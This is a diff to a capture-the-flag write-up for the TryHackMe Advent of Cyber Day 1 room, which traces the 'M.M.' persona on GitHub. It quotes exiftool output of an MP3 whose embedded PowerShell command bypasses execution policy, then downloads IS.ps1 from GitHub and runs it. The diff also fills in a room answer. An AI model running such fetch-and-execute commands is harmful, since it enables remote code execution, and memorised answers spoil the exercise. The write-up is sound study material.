@@ -171,7 +171,7 @@ For example, here are some real-world OPSEC mistakes that led to some really big
 
 
 > 1.3. <em>Who is M.M? Maybe his Github profile page would provide clues?</em><br><a id='1.3'></a>
->> <code><strong>______________</strong></code>
+>> <code><strong>Mayor Malware</strong></code>
 
 <br>
 
@@ -232,8 +232,6 @@ For example, here are some real-world OPSEC mistakes that led to some really big
 ![image](https://github.com/user-attachments/assets/963385c8-62c9-449c-b24e-6d644752d647)
 
 <br>
-
-![image](https://github.com/user-attachments/assets/4b95d488-d4d5-4164-82db-6e1e525ea05e)
 
 <pre><code>root@ip-[THM AttackBox]:~/Day1# exiftool song.mp3
 ExifTool Version Number         : 11.88
@@ -302,6 +300,62 @@ Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
 Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
 Machine ID                      : win-base-2019
 </code></pre>
+
+<br>
+<p>I accessed the following link ...</p>
+
+<pre><code>https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1</code></pre>
+
+<br>
+<p>I got this ...</p>
+
+![image](https://github.com/user-attachments/assets/8133dd4e-ad47-4621-9057-1e3ef2612f95)
+
+<br>
+
+<p>Then I accessed the below provided link in order to investigate M.M.</p>
+
+<pre><code>https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues</code></pre>
+
+<p>and got this ...</p>
+
+![image](https://github.com/user-attachments/assets/069a3c51-1b61-4b17-9d7a-2a88120d855f)
+
+<br>
+
+<p>After clicking on the second link of the previous webpage, I noticed a conversation between <code>MM-WarevilleTHM</code> and <code>Bloatware-WarevilleTHM</code></p>
+
+
+![image](https://github.com/user-attachments/assets/a10ae21b-4a24-4d27-b354-3468fed3fcf2)
+
+<br>
+
+<p>Here I discover who is M.M. ...</p>
+
+![image](https://github.com/user-attachments/assets/cd37bc27-cd30-44f4-90a0-c8423c002262)
+
+<br>
+
+<p>M.M. has 2 repositories: <code>IS</code> and <code>M.M.</code>, and joined GitHub on October 22, 2024.</p>
+
+![image](https://github.com/user-attachments/assets/95d2e62b-b3ba-4877-a3a4-a33734ea418c)
+
+<br>
+
+![image](https://github.com/user-attachments/assets/1760cdf4-c449-484b-8d7b-75108c020896)
+
+<br>
+
+<p>Nest I identified that </p>
+
+
+
+
+
+
+
+
+
 
 
 
